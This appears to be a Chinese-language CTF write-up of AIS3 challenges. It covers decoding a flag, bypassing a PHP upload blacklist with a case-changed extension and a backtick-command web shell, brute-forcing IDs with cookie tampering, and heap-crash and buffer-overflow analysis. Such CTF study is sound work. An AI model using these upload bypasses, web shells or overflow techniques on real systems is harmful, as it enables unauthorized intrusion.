<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ff=[<span class="string">&quot;181m獎&quot;</span>,<span class="string">&quot;202m當&quot;</span>,<span class="string">&quot;177m之&quot;</span>,<span class="string">&quot;210m兇&quot;</span>,<span class="string">&quot;191m深&quot;</span>,<span class="string">&quot;170m定&quot;</span>,<span class="string">&quot;189m忠&quot;</span>,<span class="string">&quot;197m忠&quot;</span>,<span class="string">&quot;192m複&quot;</span>,<span class="string">&quot;226m除&quot;</span>,<span class="string">&quot;177m率&quot;</span>,<span class="string">&quot;226m月&quot;</span>,<span class="string">&quot;191m月&quot;</span>,<span class="string">&quot;170m都&quot;</span>,<span class="string">&quot;177m三&quot;</span>,<span class="string">&quot;178m還&quot;</span>,<span class="string">&quot;177m三&quot;</span>,<span class="string">&quot;209m先&quot;</span>,<span class="string">&quot;188m而&quot;</span>,<span class="string">&quot;197m忠&quot;</span>,<span class="string">&quot;192m兇&quot;</span>,<span class="string">&quot;198m故&quot;</span>,<span class="string">&quot;192m複&quot;</span>,<span class="string">&quot;226m巳&quot;</span>,<span class="string">&quot;177m三&quot;</span>,<span class="string">&quot;222m定&quot;</span>,<span class="string">&quot;189m率&quot;</span>,<span class="string">&quot;225m陛&quot;</span>,<span class="string">&quot;194m軍&quot;</span>,<span class="string">&quot;166m除&quot;</span>,<span class="string">&quot;178m軍&quot;</span>,<span class="string">&quot;186m忠&quot;</span>,<span class="string">&quot;181m率&quot;</span>,<span class="string">&quot;226m所&quot;</span>,<span class="string">&quot;177m瀘&quot;</span>,<span class="string">&quot;226m獎&quot;</span>,<span class="string">&quot;181m獎&quot;</span>,<span class="string">&quot;218m除&quot;</span>,<span class="string">&quot;179m當&quot;</span>,<span class="string">&quot;166m鈍&quot;</span>,<span class="string">&quot;178m三&quot;</span>,<span class="string">&quot;170m斟&quot;</span>]</span><br><span class="line">ss=<span class="string">&#x27;明故五月渡瀘深入不毛今南方巳定兵甲已足當獎率三軍北碇中原庶竭駑鈍攘除奸兇興複漢室還于舊都此臣所以報先帝而忠陛下之職分也至於斟酌損&#x27;</span></span><br><span class="line"></span><br><span class="line">m=[]</span><br><span class="line">n=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ff:</span><br><span class="line">    i=i.split(<span class="string">&quot;m&quot;</span>)</span><br><span class="line">    m.append(<span class="built_in">int</span>(i[<span class="number">0</span>])-<span class="number">165</span>)</span><br><span class="line">    n.append(i[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>,<span class="number">130</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>,<span class="number">130</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>,<span class="number">130</span>):</span><br><span class="line">                <span class="keyword">if</span>(a//<span class="number">4</span>==m[i] <span class="keyword">and</span> ss[<span class="number">16</span>*(a&amp;<span class="number">3</span>)+b//<span class="number">16</span>]==n[i] <span class="keyword">and</span> <span class="number">4</span>*(b&amp;<span class="number">15</span>)+c//<span class="number">64</span>==m[i+<span class="number">1</span>] <span class="keyword">and</span> ss[c&amp;<span class="number">63</span>]==n[i+<span class="number">1</span>]):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>FLAG:<code>AIS3&#123;chaNcH4n_a1_Ch1k1ch1k1_84n8An_M1nNa_5upa5utA_n0_TAMa90_5a&#125;</code></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Simple-File-Uploader-100-easy"><a href="#Simple-File-Uploader-100-easy" class="headerlink" title="Simple File Uploader [100] [easy]"></a>Simple File Uploader [100] [easy]</h2><div class="note default flat"><p><img src="https://i.imgur.com/BhxYLNV.png"><br>一個簡單檔案上傳者。<br>Author: wii</p>
</div>

<blockquote>
<p>route: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:8988/">http://chals1.ais3.org:8988</a>(vpn required)</p>
</blockquote>
<p>這題是一個上傳檔案的網站，打開 source code 可以發現它鎖了很多 php 的格式，明顯是要讓我們上傳可上傳可執行的 php 檔，其中因為它使用黑名單的方式，稍微查一下可以發現副檔名大小寫差異便可繞過，建立<code>aa.Php</code>即可上傳 php(用<code>echo 1;</code>測試可否執行)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">1</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接著需要繞過 system function，source code 中可以發現他把幾乎所有的 system 執行指令都鎖起來了，但 php 有一個特殊的方式可以繞過執行，以``包起的字串會被當成指令嘗試執行，因此可以構造出指令嘗試執行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$waku</span>=`cd ../../../../../../;ls;`;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$waku</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/wHCkA3I.jpg"></p>
<p>可以看到一個<code>rUn_M3_t0_9et_fL4g</code>檔案，執行它即可得到 flag。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$waku</span>=`cd ../../../../../../;ls;./rUn_M3_t0_9et_fL4g`;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$waku</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//AIS3&#123;H3yyyyyyyy_U_g0t_mi٩(ˊᗜˋ*)و&#125;</span></span><br></pre></td></tr></table></figure>

<p>FLAG:<code>AIS3&#123;H3yyyyyyyy_U_g0t_mi٩(ˊᗜˋ*)و&#125;</code></p>
<h2 id="Poking-Bear-100-baby"><a href="#Poking-Bear-100-baby" class="headerlink" title="Poking Bear [100] [baby]"></a>Poking Bear [100] [baby]</h2><div class="note default flat"><p><img src="https://i.imgur.com/MchcePB.jpg"><br>Poke the SECRET BEAR!<br>Author: wii</p>
</div>

<blockquote>
<p>route: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:8987/">http://chals1.ais3.org:8987</a>(vpn required)</p>
</blockquote>
<p>打開網頁可以發現一個可以戳熊熊(?)的介面，點進去可以發現除了<code>SECRET BEAR</code>之外其他的熊都有一個特殊的號碼掛在<code>http://chals1.ais3.org:8987/bear/&#123;id&#125;</code>之中，所以我們的目標十分明確:找到 SECRET BEAR 的 id!</p>
<p>其他 bear 的 id 都在首頁的 html 裡，所以只要寫段 python 來爆搜沒有在裡面的 id 即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://chals1.ais3.org:8987/bear/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    res = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;This is not even a bear.&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 29 82 327 350 499 777 ...</span></span><br></pre></td></tr></table></figure>

<p>可以發現 499 沒有在裡面，訪問 <a target="_blank" rel="noopener" href="http://chals1.ais3.org:8987/bear/499">http://chals1.ais3.org:8987/bear/499</a> 可以有一個戳<code>SECRET BEAR</code>的頁面，但戳下去它會說你不是<code>bear poker</code>，這時候直覺看看 cookie 有一個<code>human</code>類別，把後面的值改成<code>bear poker</code>再戳它就可以拿到 flag。</p>
<p>FLAG:<code>AIS3&#123;y0u_P0l&lt;3_7h3_Bear_H@rdLy&gt;&lt;&#125;</code></p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="SAAS-Crash-40-C-heap-easy"><a href="#SAAS-Crash-40-C-heap-easy" class="headerlink" title="SAAS - Crash [40] [C++][heap][easy]"></a>SAAS - Crash [40] [C++][heap][easy]</h2><div class="note default flat"><p>This challenge is not about Software as a Service, but String as a Service.</p>
<blockquote>
<p>You only need to crash the program at remote to get this flag, no need to actually write exploit for it</p>
</blockquote>
<p>Author: maple3142</p>
</div>

<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/18YJGrtqcZIr5cNufSWAQnWnegHM5ww87/view?usp=sharing">https://drive.google.com/file/d/18YJGrtqcZIr5cNufSWAQnWnegHM5ww87/view?usp=sharing</a></p>
</blockquote>
<p>這題給了 source code package 跟 netcat 網址，先看看 source code:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">String</span> &#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">char</span> *str;</span><br><span class="line">	<span class="keyword">size_t</span> len;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">String</span>(<span class="keyword">const</span> <span class="keyword">char</span> *s) &#123;</span><br><span class="line">		len = <span class="built_in">strlen</span>(s);</span><br><span class="line">		str = <span class="keyword">new</span> <span class="keyword">char</span>[len + <span class="number">1</span>];</span><br><span class="line">		<span class="built_in">strcpy</span>(str, s);</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">String</span>() &#123; <span class="keyword">delete</span>[] str; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_STRS = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">char</span> tmp[<span class="number">4096</span>];</span><br><span class="line">String *strs[MAX_STRS] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readidx</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> c;</span><br><span class="line">	<span class="keyword">int</span> idx;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%c&quot;</span>, &amp;idx, &amp;c);</span><br><span class="line">	<span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= MAX_STRS) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Bad index\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Length: %zu\n&quot;</span>, s.len);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">	<span class="built_in">write</span>(<span class="number">1</span>, s.str, s.len);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;===== S(tring)AAS =====\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1. Create string\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2. Edit string\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3. Print string\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;4. Delete string\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> choice, idx;</span><br><span class="line">		<span class="keyword">char</span> c;</span><br><span class="line">		<span class="built_in">menu</span>();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">		<span class="built_in"><span class="keyword">switch</span></span> (choice) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				idx = <span class="built_in">readidx</span>();</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">				<span class="built_in">scanf</span>(<span class="string">&quot;%4095[^\n]&quot;</span>, tmp);</span><br><span class="line">				<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;c);</span><br><span class="line">				strs[idx] = <span class="keyword">new</span> <span class="built_in">String</span>(tmp);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				idx = <span class="built_in">readidx</span>();</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;New Content: &quot;</span>);</span><br><span class="line">				<span class="keyword">if</span> (strs[idx] != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">					<span class="built_in">scanf</span>(<span class="string">&quot;%4095[^\n]&quot;</span>, tmp);</span><br><span class="line">					<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;c);</span><br><span class="line">					<span class="built_in">memcpy</span>(strs[idx]-&gt;str, tmp, strs[idx]-&gt;len);</span><br><span class="line">					strs[idx]-&gt;str[strs[idx]-&gt;len] = <span class="number">0</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;String #%d doesn&#x27;t exist!\n&quot;</span>, idx);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				idx = <span class="built_in">readidx</span>();</span><br><span class="line">				<span class="keyword">if</span> (strs[idx] != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">					<span class="built_in">print</span>(*strs[idx]);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;String #%d doesn&#x27;t exist!\n&quot;</span>, idx);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				idx = <span class="built_in">readidx</span>();</span><br><span class="line">				<span class="keyword">if</span> (strs[idx] != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">					<span class="keyword">delete</span> strs[idx];</span><br><span class="line">					strs[idx] = <span class="literal">nullptr</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;String #%d doesn&#x27;t exist!\n&quot;</span>, idx);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Bad option&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以發現它的輸入限制 4095 位，那輸入 4096 位是否能讓程式 crash 呢?</p>
<p>構造一個長於 4096 位的字串輸入<code>Create String</code>，接著將它輸出，第一次輸出沒有噴 Error，再次輸出後便 Crash 了，得到 flag。</p>
<p><img src="https://i.imgur.com/gNmJwvK.jpg"></p>
<p>FLAG:<code>AIS3&#123;congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?&#125;</code></p>
<blockquote>
<p>很抱歉，窩迷有拿到 shell TAT</p>
</blockquote>
<h2 id="BOF2WIN-100-baby"><a href="#BOF2WIN-100-baby" class="headerlink" title="BOF2WIN [100] [baby]"></a>BOF2WIN [100] [baby]</h2><div class="note default flat"><p>Exploit the bof !!<br><code>nc chals1.ais3.org 12347</code><br>Author: 🎃</p>
</div>

<blockquote>
<p>file: <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1MajFqDwi4SDtCCb-bthHUG9Y5voMv4tN/view?usp=sharing">https://drive.google.com/file/d/1MajFqDwi4SDtCCb-bthHUG9Y5voMv4tN/view?usp=sharing</a></p>
</blockquote>
<p>這題是非常經典的 buffer overflow 題，先來看看 source code:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_the_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/home/bof2win/flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">read</span>(fd, buf, <span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, buf, <span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">    <span class="built_in">gets</span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s!\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以發現<code>gets(buf)</code>的使用部分有漏洞，無法限制是使用者的輸入，所以我們只要蓋掉 buffer 並把 return address 改成<code>get_the_flag</code>的 function address 即可。</p>
<p>先用<code>checksec</code>確定一下開啟的保護機制:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; checksec bof2win</span><br><span class="line">[*] &#39;C:\\Users\\Administrator\\Downloads\\bof2win&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>PIE 沒開，表示 function address 不會被 randomize，可以直接使用 function fixed address</p>
<p>用 gdb 觀察<code>get_the_flag</code>的 function address</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&gt; gdb bof2win</span><br><span class="line">GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http:&#x2F;&#x2F;gnu.org&#x2F;licenses&#x2F;gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;gdb&#x2F;bugs&#x2F;&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;gdb&#x2F;documentation&#x2F;&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line"></span><br><span class="line">pwndbg: loaded 193 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print&#x2F;break)</span><br><span class="line">Reading symbols from bof2win...(no debugging symbols found)...done.</span><br><span class="line">pwndbg&gt;</span><br><span class="line">pwndbg&gt; info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000000401000  _init</span><br><span class="line">0x00000000004010b0  puts@plt</span><br><span class="line">0x00000000004010c0  write@plt</span><br><span class="line">0x00000000004010d0  printf@plt</span><br><span class="line">0x00000000004010e0  close@plt</span><br><span class="line">0x00000000004010f0  read@plt</span><br><span class="line">0x0000000000401100  gets@plt</span><br><span class="line">0x0000000000401110  setvbuf@plt</span><br><span class="line">0x0000000000401120  open@plt</span><br><span class="line">0x0000000000401130  _start</span><br><span class="line">0x0000000000401160  _dl_relocate_static_pie</span><br><span class="line">0x0000000000401170  deregister_tm_clones</span><br><span class="line">0x00000000004011a0  register_tm_clones</span><br><span class="line">0x00000000004011e0  __do_global_dtors_aux</span><br><span class="line">0x0000000000401210  frame_dummy</span><br><span class="line">0x0000000000401216  get_the_flag</span><br><span class="line">0x00000000004012a4  main</span><br><span class="line">0x0000000000401330  __libc_csu_init</span><br><span class="line">0x00000000004013a0  __libc_csu_fini</span><br><span class="line">0x00000000004013a8  _fini</span><br></pre></td></tr></table></figure>

<p>可以得到 function address <code>0x401216</code></p>
<p>再用 gdb 觀察 buf 跟 ret 的 address</p>
<p><img src="https://i.imgur.com/0UQC1kM.jpg"></p>
<p>buf address:<code>0x7fffffffdee0</code></p>
<p><img src="https://i.imgur.com/e95WpnI.jpg"></p>
<p>ret address:<code>0x7fffffffdef8</code></p>
<p>所以要蓋掉<code>0x7fffffffdef8-0x7fffffffdee0=24</code>個字元<br>寫個 exploit 即可拿到 flag。</p>
